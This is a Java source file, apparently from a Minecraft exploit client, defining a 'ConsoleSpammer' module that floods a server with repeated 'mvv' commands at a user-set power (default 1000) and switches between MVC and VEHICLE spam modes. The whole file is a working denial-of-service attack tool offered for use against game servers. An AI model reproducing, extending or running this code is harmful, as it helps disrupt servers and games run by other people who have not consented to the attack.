package us.whitedev.exploits.impl;

import java.util.List;
import java.util.Locale;
import us.whitedev.commands.impl.ExploitCommand;
import us.whitedev.commands.impl.ExploitCommand.SpammerMode;
import us.whitedev.exploits.Exploit;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

public class ConsoleSpammer implements Exploit {
   private static final String EXPLOIT_NAME = "ConsoleSpammer";

   public void onExploit(String[] args) {
      int power = Integer.parseInt(args[2]);
      String mode = args[3];
      this.setExploitMode(mode);
      if (ExploitCommand.SPAMMERMODE == SpammerMode.MVC) {
         msgHelper.sendMessage(String.format("Sending Exploit... &8[&f%s&8]", this.getName()), true);

         for(int i = 0; i < power; ++i) {
            PacketHelper.sendCommand("mvv");
         }

         msgHelper.sendMessage("Exploit &asuccessfully &7sent!", true);
      }

   }

   private void setExploitMode(String mode) {
      try {
         SpammerMode spammerMode = SpammerMode.valueOf(mode.toUpperCase(Locale.ROOT));
         if (ExploitCommand.SPAMMERMODE == SpammerMode.VEHICLE && spammerMode == ExploitCommand.SPAMMERMODE) {
            ExploitCommand.SPAMMERMODE = SpammerMode.DISABLED;
            msgHelper.sendMessage(String.format("Exploit &7successfully &cunloaded&7! &8[&f%s&8]", mode), true);
         } else {
            ExploitCommand.SPAMMERMODE = spammerMode;
            msgHelper.sendMessage(String.format("Exploit &7successfully &aloaded&7! &8[&f%s&8]", mode), true);
            if (ExploitCommand.SPAMMERMODE == SpammerMode.VEHICLE) {
               msgHelper.sendMessage("Waiting for the player to get into some vehicle...", true);
            }
         }
      } catch (IllegalArgumentException var3) {
         msgHelper.sendMessage("This Spammer Mode &cdoesnt exist&7!", true);
         msgHelper.sendMessage("All Modes&8: &fMVC, VEHICLE", true);
      }

   }

   public String getName() {
      return "ConsoleSpammer";
   }

   public List<OptionUtil> getOptions() {
      return List.of(new OptionUtil("Power", OptionType.INTEGER), new OptionUtil("Mode", OptionType.LIST, new String[]{"Mvc", "Vehicle"}));
   }

   public String getArgsUsage() {
      return "power[1000] mode[Mvc]";
   }

   public String getDescription() {
      return "Console Spammer";
   }
}
